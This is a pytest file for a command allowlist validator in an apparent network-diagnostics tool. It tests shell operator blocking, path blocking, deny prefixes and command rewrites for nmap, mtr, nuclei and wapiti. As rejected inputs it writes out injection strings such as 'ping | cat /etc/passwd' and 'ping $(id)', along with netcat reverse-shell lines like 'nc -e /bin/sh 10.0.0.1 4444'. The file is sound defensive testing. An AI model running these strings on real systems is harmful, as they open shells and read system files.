"""
Tests for command validation and rewrite logic in commands.py.

These tests cover the security-critical path: shell operator blocking, path
blocking, allowlist prefix matching, deny prefix (!), and command rewrites.
Run with: pytest tests/ (from the repo root)
"""

import unittest.mock as mock

from commands import (
    command_root,
    is_command_allowed,
    rewrite_command,
    runtime_missing_command_message,
    runtime_missing_command_name,
    split_command_argv,
)


# ── Helpers ───────────────────────────────────────────────────────────────────

ALLOW = ["ping", "nmap", "dig", "curl", "mtr", "traceroute", "nuclei", "wapiti"]
DENY  = []


def _check(cmd, allow=None, deny=None):
    """Call is_command_allowed with a mocked allowlist."""
    a = allow if allow is not None else ALLOW
    d = deny  if deny  is not None else DENY
    with mock.patch("commands.load_allowed_commands", return_value=(a, d)):
        return is_command_allowed(cmd)


# ── Shell operator blocking ────────────────────────────────────────────────────

class TestShellOperators:
    def test_pipe(self):
        ok, _ = _check("ping | cat /etc/passwd")
        assert not ok

    def test_double_ampersand(self):
        ok, _ = _check("ping google.com && id")
        assert not ok

    def test_semicolon(self):
        ok, _ = _check("ping google.com ; id")
        assert not ok

    def test_double_pipe(self):
        ok, _ = _check("ping google.com || id")
        assert not ok

    def test_backtick(self):
        ok, _ = _check("ping `id`")
        assert not ok

    def test_dollar_subshell(self):
        ok, _ = _check("ping $(id)")
        assert not ok

    def test_redirect_out(self):
        ok, _ = _check("ping google.com > /etc/passwd")
        assert not ok

    def test_redirect_append(self):
        ok, _ = _check("ping google.com >> /tmp/x")
        assert not ok

    def test_redirect_in(self):
        ok, _ = _check("curl example.com < /etc/passwd")
        assert not ok


# ── Path blocking ─────────────────────────────────────────────────────────────

class TestPathBlocking:
    def test_data_path(self):
        ok, _ = _check("curl /data/history.db")
        assert not ok

    def test_tmp_path(self):
        ok, _ = _check("curl /tmp/secret")
        assert not ok

    def test_url_with_data_segment(self):
        # URLs like https://example.com/data/file should NOT be blocked
        ok, _ = _check("curl https://example.com/data/file")
        assert ok

    def test_url_with_tmp_segment(self):
        ok, _ = _check("curl https://example.com/tmp/thing")
        assert ok


# ── Allowlist prefix matching ─────────────────────────────────────────────────

class TestAllowlist:
    def test_exact_match(self):
        ok, _ = _check("ping")
        assert ok

    def test_prefix_with_args(self):
        ok, _ = _check("ping -c 4 google.com")
        assert ok

    def test_not_in_list(self):
        ok, _ = _check("nc -e /bin/sh 10.0.0.1 4444")
        assert not ok

    def test_prefix_must_have_space(self):
        # "pingreally" should NOT match the "ping" prefix
        ok, _ = _check("pingreally google.com")
        assert not ok

    def test_unrestricted_when_no_file(self):
        with mock.patch("commands.load_allowed_commands", return_value=(None, [])):
            ok, _ = is_command_allowed("anything goes")
        assert ok

    def test_case_insensitive(self):
        ok, _ = _check("PING google.com")
        assert ok


# ── Deny prefix (!) ───────────────────────────────────────────────────────────

class TestDenyPrefix:
    def test_deny_takes_priority(self):
        # load_allowed_commands lowercases entries; pass pre-lowercased values in mock
        ok, _ = _check("nmap -sU 10.0.0.1", allow=["nmap"], deny=["nmap -su"])
        assert not ok

    def test_allow_still_works_without_denied_flag(self):
        ok, _ = _check("nmap -sT 10.0.0.1", allow=["nmap"], deny=["nmap -su"])
        assert ok

    def test_deny_exact_match(self):
        ok, _ = _check("nmap -sU", allow=["nmap"], deny=["nmap -su"])
        assert not ok

    def test_deny_prefix_with_more_args(self):
        # "nmap --script vuln 10.0.0.1" should be denied if "nmap --script" is in deny list
        ok, _ = _check("nmap --script vuln 10.0.0.1", allow=["nmap"], deny=["nmap --script"])
        assert not ok

    def test_empty_deny_list_has_no_effect(self):
        ok, _ = _check("nmap -sV 10.0.0.1", allow=["nmap"], deny=[])
        assert ok

    def test_deny_flag_anywhere_in_command(self):
        # Flag should be denied even when other flags precede it
        ok, _ = _check("curl -s -o /tmp/out https://example.com", allow=["curl"], deny=["curl -o"])
        assert not ok

    def test_deny_flag_at_end(self):
        ok, _ = _check("nmap -sT 10.0.0.1 --script", allow=["nmap"], deny=["nmap --script"])
        assert not ok

    def test_deny_single_char_matches_combined_group(self):
        # Single-char deny "-o" matches "-oN" — treat as combined flag group
        # (useful for blocking all nmap file output with a single !nmap -o entry)
        ok, _ = _check("nmap -oN output.txt", allow=["nmap"], deny=["nmap -o"])
        assert not ok

    def test_devnull_exception_prefix(self):
        # curl -o /dev/null ... is a common pattern for checking HTTP status — should be allowed
        ok, _ = _check("curl -o /dev/null -s -w \"%{http_code}\" https://example.com",
                        allow=["curl"], deny=["curl -o"])
        assert ok

    def test_devnull_exception_anywhere(self):
        # Flag anywhere in command pointing to /dev/null should also be allowed
        ok, _ = _check("wget -q -o /dev/null --server-response https://example.com",
                        allow=["wget"], deny=["wget -o"])
        assert ok

    def test_devnull_exception_does_not_allow_real_paths(self):
        ok, _ = _check("curl -o /tmp/out https://example.com", allow=["curl"], deny=["curl -o"])
        assert not ok

    # Single-char combined flag matching
    def test_deny_single_char_flag_combined_at_end(self):
        # -ve contains denied -e
        ok, _ = _check("nc -ve 127.0.0.1 80", allow=["nc"], deny=["nc -e"])
        assert not ok

    def test_deny_single_char_flag_combined_at_start(self):
        # -ev contains denied -e
        ok, _ = _check("nc -ev 127.0.0.1 80", allow=["nc"], deny=["nc -e"])
        assert not ok

    def test_deny_single_char_flag_combined_in_middle(self):
        # -zve contains denied -e
        ok, _ = _check("nc -zve 127.0.0.1 80", allow=["nc"], deny=["nc -e"])
        assert not ok

    def test_deny_single_char_flag_combined_c_flag(self):
        # -vc contains denied -c
        ok, _ = _check("nc -vc /bin/sh 127.0.0.1 80", allow=["nc"], deny=["nc -c"])
        assert not ok

    def test_deny_single_char_flag_standalone_still_caught(self):
        # Plain -e still caught as before
        ok, _ = _check("nc -e /bin/sh 127.0.0.1 80", allow=["nc"], deny=["nc -e"])
        assert not ok

    def test_deny_single_char_flag_unrelated_combined_allowed(self):
        # -zv does not contain -e or -c, should be allowed
        ok, _ = _check("nc -zv 127.0.0.1 80", allow=["nc"], deny=["nc -e", "nc -c"])
        assert ok

    def test_deny_single_char_does_not_affect_multi_char_matching(self):
        # Multi-char flag --script should still use exact-token matching, not char search
        ok, _ = _check("nmap -sT 10.0.0.1", allow=["nmap"], deny=["nmap --script"])
        assert ok


# ── Command rewrites ──────────────────────────────────────────────────────────

class TestRewrites:
    def test_mtr_adds_report_wide(self):
        cmd, notice = rewrite_command("mtr google.com")
        assert "--report-wide" in cmd
        assert notice is not None

    def test_mtr_no_rewrite_if_report_flag_present(self):
        cmd, notice = rewrite_command("mtr --report google.com")
        assert "--report-wide" not in cmd
        assert notice is None

    def test_mtr_no_rewrite_if_report_wide_present(self):
        cmd, notice = rewrite_command("mtr --report-wide google.com")
        assert cmd.count("--report-wide") == 1  # not doubled
        assert notice is None

    def test_mtr_short_flag_no_rewrite(self):
        cmd, notice = rewrite_command("mtr -r google.com")
        assert "--report-wide" not in cmd
        assert notice is None

    def test_nmap_adds_privileged(self):
        cmd, notice = rewrite_command("nmap -sV 10.0.0.1")
        assert "--privileged" in cmd
        assert notice is None  # silent rewrite

    def test_nmap_no_double_privileged(self):
        cmd, _ = rewrite_command("nmap --privileged -sV 10.0.0.1")
        assert cmd.count("--privileged") == 1

    def test_nuclei_adds_template_dir(self):
        cmd, notice = rewrite_command("nuclei -u https://example.com")
        assert "-ud /tmp/nuclei-templates" in cmd
        assert notice is None

    def test_nuclei_no_rewrite_if_ud_present(self):
        cmd, _ = rewrite_command("nuclei -ud /tmp/my-templates -u https://example.com")
        assert cmd.count("-ud") == 1

    def test_wapiti_adds_stdout_redirect(self):
        cmd, notice = rewrite_command("wapiti http://example.com")
        assert "-f txt" in cmd
        assert "/dev/stdout" in cmd
        assert notice is not None

    def test_wapiti_no_rewrite_if_output_set(self):
        cmd, notice = rewrite_command("wapiti http://example.com -o /tmp/report.txt")
        assert "/dev/stdout" not in cmd
        assert notice is None

    def test_no_rewrite_for_other_commands(self):
        cmd, notice = rewrite_command("dig google.com")
        assert cmd == "dig google.com"
        assert notice is None


# ── Runtime command availability helpers ─────────────────────────────────────

class TestRuntimeCommandHelpers:
    def test_split_command_argv_uses_shell_like_tokenization(self):
        assert split_command_argv('curl -H "X-Test: 1" https://example.com') == [
            "curl", "-H", "X-Test: 1", "https://example.com"
        ]

    def test_command_root_returns_lowercased_first_token(self):
        assert command_root("NMAP -sV example.com") == "nmap"

    def test_command_root_returns_none_for_blank_input(self):
        assert command_root("   ") is None

    def test_runtime_missing_command_name_returns_none_when_installed(self):
        with mock.patch("commands.resolve_runtime_command", return_value="/usr/bin/curl"):
            assert runtime_missing_command_name("curl https://example.com") is None

    def test_runtime_missing_command_name_returns_root_when_missing(self):
        with mock.patch("commands.resolve_runtime_command", return_value=None):
            assert runtime_missing_command_name("nmap -sV example.com") == "nmap"

    def test_runtime_missing_command_message_is_stable(self):
        assert runtime_missing_command_message("nmap") == "Command is not installed on this instance: nmap"
